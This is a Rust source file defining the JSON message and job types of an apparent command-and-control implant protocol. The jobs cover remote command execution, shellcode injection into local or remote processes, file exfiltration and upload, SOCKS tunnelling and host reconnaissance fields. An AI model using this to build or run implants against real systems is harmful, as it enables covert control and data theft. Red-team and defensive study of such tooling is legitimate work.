/// Protocol types matching the Fox3 / fox3-message JSON wire format.
///
/// messages.Base uses lowercase JSON tags (from the Go struct tags).
/// jobs.Job has NO JSON tags in Go so fields marshal as PascalCase.
/// Job payload types (Command, Results, Socks, FileTransfer, Shellcode) each
/// have their own lowercase JSON tags defined on the Go struct.
///
/// # Verified wire formats (from github.com/Ne0nd0g/fox3-message@v1.3.0)
///
/// jobs.Socks   json tags: id, index, data ([]byte→base64), close
///   {"id":"<uuid>","index":0,"data":"BQEA","close":false}
///
/// jobs.FileTransfer  json tags: dest, blob, download
///   Note: Go struct field names differ from json tags:
///     FileLocation → "dest"
///     FileBlob     → "blob"
///     IsDownload   → "download"
///
/// jobs.Shellcode  json tags: method, bytes (base64), pid (omitempty)
///   {"method":"self","bytes":"<base64>"}
///   {"method":"remote","bytes":"<base64>","pid":1234}
///
/// jobs.Command  json tags: command, args
///   Used by CMD, CONTROL, NATIVE, MODULE job types.

use serde::{Deserialize, Serialize};
use serde_json::Value;
use uuid::Uuid;

// ── Message type constants (messages.Type iota) ──────────────────────────────
pub const MSG_CHECKIN: i32 = 1;
#[allow(dead_code)]
pub const MSG_OPAQUE: i32  = 2;
pub const MSG_JOBS: i32    = 3;
pub const MSG_IDLE: i32    = 4;

// ── Job type constants (jobs.Type iota) ──────────────────────────────────────
pub const JOB_CMD: i32          = 1;
pub const JOB_CONTROL: i32      = 2;
pub const JOB_SHELLCODE: i32    = 3;
pub const JOB_NATIVE: i32       = 4;
pub const JOB_FILETRANSFER: i32 = 5;
pub const JOB_OK: i32           = 6;
pub const JOB_MODULE: i32       = 7;
pub const JOB_SOCKS: i32        = 8;
pub const JOB_RESULT: i32       = 9;
pub const JOB_AGENTINFO: i32    = 10;
// ── messages.Base ─────────────────────────────────────────────────────────────
/// Root message wrapper. JSON field names match Go struct tags.
#[derive(Debug, Serialize, Deserialize)]
pub struct Base {
    pub id: Uuid,

    #[serde(rename = "type")]
    pub msg_type: i32,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub payload: Option<Value>,

    pub padding: String,

    #[serde(skip_serializing_if = "Option::is_none")]
    pub token: Option<String>,

    #[serde(rename = "delegate", skip_serializing_if = "Option::is_none")]
    pub delegates: Option<Value>,
}

// ── jobs.Job ──────────────────────────────────────────────────────────────────
/// PascalCase because Go's jobs.Job has no json struct tags.
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Job {
    #[serde(rename = "AgentID")]
    pub agent_id: Uuid,

    #[serde(rename = "ID")]
    pub id: String,

    #[serde(rename = "Token")]
    pub token: Uuid,

    #[serde(rename = "Type")]
    pub job_type: i32,

    #[serde(rename = "Payload")]
    pub payload: Option<Value>,
}

// ── Job payload types — lowercase JSON tags from Go ───────────────────────────

/// Shared by CMD, CONTROL, NATIVE, and MODULE job types.
/// Go: `json:"command"` / `json:"args"`
#[derive(Debug, Serialize, Deserialize)]
pub struct Command {
    pub command: String,
    /// Go serializes nil slices as JSON null; treat null the same as [].
    #[serde(default, deserialize_with = "deser_args")]
    pub args: Vec<String>,
}

fn deser_args<'de, D: serde::Deserializer<'de>>(d: D) -> Result<Vec<String>, D::Error> {
    Ok(Option::<Vec<String>>::deserialize(d)?.unwrap_or_default())
}

/// Result returned by the agent after executing a job.
/// Go: `json:"stdout"` / `json:"stderr"`
#[derive(Debug, Serialize, Deserialize)]
pub struct Results {
    pub stdout: String,
    pub stderr: String,
}

/// Agent configuration sent on first checkin or in response to agentInfo.
#[derive(Debug, Serialize, Deserialize)]
pub struct AgentInfo {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub version: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub build: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub waittime: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub paddingmax: Option<i32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub maxretry: Option<i32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub proto: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub sysinfo: Option<SysInfo>,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct SysInfo {
    #[serde(skip_serializing_if = "Option::is_none")]
    pub platform: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub architecture: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub username: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub hostname: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub pid: Option<i32>,
    #[serde(skip_serializing_if = "Option::is_none")]
    pub ips: Option<Vec<String>>,
}

// ── SOCKS tunnel payload ───────────────────────────────────────────────────────
//
// jobs.Socks in Go (fox3-message@v1.3.0) has lowercase json struct tags.
// Data is a Go []byte → JSON encodes as standard-base64 string.
//
// Wire example:
//   {"id":"<uuid>","index":0,"data":"BQEA","close":false}
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct SocksPayload {
    /// Connection UUID — shared across all packets for the same SOCKS session.
    pub id: Uuid,

    /// Monotonically increasing sequence number (independent per direction).
    pub index: i32,

    /// Raw payload bytes, base64-encoded (Go []byte ↔ JSON string convention).
    /// Absent / null when there is no data (e.g., close-only packets).
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub data: Option<String>,

    /// True signals the remote side closed the connection.
    #[serde(default)]
    pub close: bool,
}

impl SocksPayload {
    /// Decode the base64 `data` field.  Returns an empty vec when absent.
    pub fn decode_data(&self) -> Vec<u8> {
        use base64::Engine as _;
        self.data
            .as_deref()
            .and_then(|s| base64::engine::general_purpose::STANDARD.decode(s).ok())
            .unwrap_or_default()
    }

    /// Encode raw bytes into the `data` field.
    pub fn from_bytes(id: Uuid, index: i32, data: &[u8], close: bool) -> Self {
        use base64::Engine as _;
        let encoded = if data.is_empty() {
            None
        } else {
            Some(base64::engine::general_purpose::STANDARD.encode(data))
        };
        Self { id, index, data: encoded, close }
    }
}

// ── File transfer payload ──────────────────────────────────────────────────────
//
// jobs.FileTransfer in Go has lowercase json struct tags that differ from the
// Go field names:
//   FileLocation → json:"dest"
//   FileBlob     → json:"blob"
//   IsDownload   → json:"download"
//
// download=true  → server is sending a file TO the agent (agent writes it).
// download=false → agent should read and send a file back TO the server.
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct FileTransfer {
    /// Absolute path of the file on the agent's filesystem.
    #[serde(rename = "dest")]
    pub file_location: String,

    /// Base64-encoded file contents (or chunk contents).
    #[serde(rename = "blob", default, skip_serializing_if = "String::is_empty")]
    pub file_blob: String,

    /// Direction: true = server→agent (upload), false = agent→server (download).
    #[serde(rename = "download")]
    pub is_download: bool,
}

impl FileTransfer {
    /// Decode `file_blob` bytes.  Returns an empty vec when the field is absent.
    pub fn decode_blob(&self) -> Vec<u8> {
        use base64::Engine as _;
        if self.file_blob.is_empty() {
            return vec![];
        }
        base64::engine::general_purpose::STANDARD
            .decode(&self.file_blob)
            .unwrap_or_default()
    }

    /// Build a download result from raw bytes.
    pub fn encode_result(file_location: String, data: &[u8]) -> Self {
        use base64::Engine as _;
        Self {
            file_location,
            file_blob: base64::engine::general_purpose::STANDARD.encode(data),
            is_download: true, // from agent's perspective: it is downloading (sending to server)
        }
    }
}

// ── Shellcode payload ─────────────────────────────────────────────────────────
//
// jobs.Shellcode in Go has lowercase json struct tags:
//   Method → json:"method"   "self" | "remote" | "rtlcreateuserthread" | "userapc"
//   Bytes  → json:"bytes"    base64-encoded raw shellcode
//   PID    → json:"pid,omitempty"  target process ID (0 = current process)
//
// Wire examples:
//   {"method":"self","bytes":"<base64>"}
//   {"method":"remote","bytes":"<base64>","pid":1234}
#[derive(Debug, Serialize, Deserialize, Clone)]
pub struct Shellcode {
    /// Execution method: "self", "remote", "rdll", "bof".
    pub method: String,

    /// Base64-encoded raw shellcode / DLL / COFF bytes.
    pub bytes: String,

    /// Target process PID (only used for remote-injection methods).
    /// Omitted from JSON when 0 (self-injection).
    #[serde(default, skip_serializing_if = "pid_is_zero")]
    pub pid: u32,

    /// BOF-only: optional Beacon-format argument buffer (base64).
    /// When present, `bytes` is the raw COFF and this is the packed args.
    /// When absent for a "bof" job, `bytes` must include a 4-byte LE
    /// length prefix followed by the COFF then the args inline.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub bof_args: Option<String>,
}

fn pid_is_zero(p: &u32) -> bool { *p == 0 }

impl Shellcode {
    /// Decode the base64 `bytes` field into raw shellcode/DLL/COFF.
    pub fn decode_bytes(&self) -> Vec<u8> {
        use base64::Engine as _;
        base64::engine::general_purpose::STANDARD
            .decode(&self.bytes)
            .unwrap_or_default()
    }

    /// Decode the optional `bof_args` field.  Returns empty vec when absent.
    pub fn decode_bof_args(&self) -> Vec<u8> {
        use base64::Engine as _;
        self.bof_args
            .as_deref()
            .and_then(|s| base64::engine::general_purpose::STANDARD.decode(s).ok())
            .unwrap_or_default()
    }
}
